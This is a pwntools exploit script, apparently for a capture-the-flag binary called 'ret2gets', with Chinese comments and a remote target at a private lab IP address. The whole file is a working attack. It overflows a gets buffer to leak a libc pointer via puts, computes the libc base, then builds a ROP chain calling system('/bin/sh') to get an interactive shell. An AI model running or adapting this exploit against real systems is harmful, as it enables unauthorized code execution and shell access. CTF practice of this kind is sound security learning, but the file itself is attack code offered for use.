# python3 ret2gets.py REMOTE  #运行时加remote
from pwn import *
s       = lambda data               : io.send(data)
sa      = lambda delim, data        : io.sendafter(str(delim), data)
sl      = lambda data               : io.sendline(data)
sla     = lambda delim, data        : io.sendlineafter(str(delim), data)
r       = lambda num                : io.recv(num)
ru      = lambda delims, drop=True  : io.recvuntil(delims, drop)
itr     = lambda                   : io.interactive()
uu32    = lambda data              : u32(data.ljust(4, b'\x00'))
uu64    = lambda data              : u64(data.ljust(8, b'\x00'))
context.log_level = 'debug'
context.binary = binary = './ret2gets'
gdbscript = '''
'''
def start(argv=[], *a, **kw):
    if args.GDB:
        proc = process([binary] + argv, *a, **kw)
        gdb.attach(proc, gdbscript=gdbscript)
        return proc
    elif args.REMOTE:
        return remote('10.5.101.125', 28015)  #改地址
    else:
        return process([binary] + argv, *a, **kw)

elf = ELF(binary)
libc = ELF('libc.so.6')
rop = ROP(elf)
io = start()
pop_rdi = 0x00000000004011f3               #ROPgadget --binary ./ret2gets|grep "pop rdi"
gets_plt = elf.plt['gets']
puts_plt = elf.plt['puts']
payload = b'a'*0x28 + p64(gets_plt) + p64(puts_plt) + p64(elf.sym['main'])# ida 里面mian函数gets变量的var_20+8    
sl(payload)
sl(b"A" * 4 + b"\x00"*3) #锁的固定结构体
ru(b"ROP me if you can!\n")
r(8)          #接受aaaa00 00 00
tls = uu64(r(6))
print(hex(tls))
libc_base = tls - 0x1f3580
system_addr = libc_base + libc.sym['system']
sh_addr = libc_base + next(libc.search(b'/bin/sh'))
payload = b'a'*0x28 + p64(pop_rdi) + p64(sh_addr) + p64(system_addr)
sl(payload)
itr()